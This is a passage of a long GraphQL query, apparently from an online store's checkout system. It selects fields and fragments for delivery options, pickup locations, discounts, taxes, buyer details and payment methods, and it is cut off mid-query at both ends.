PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on 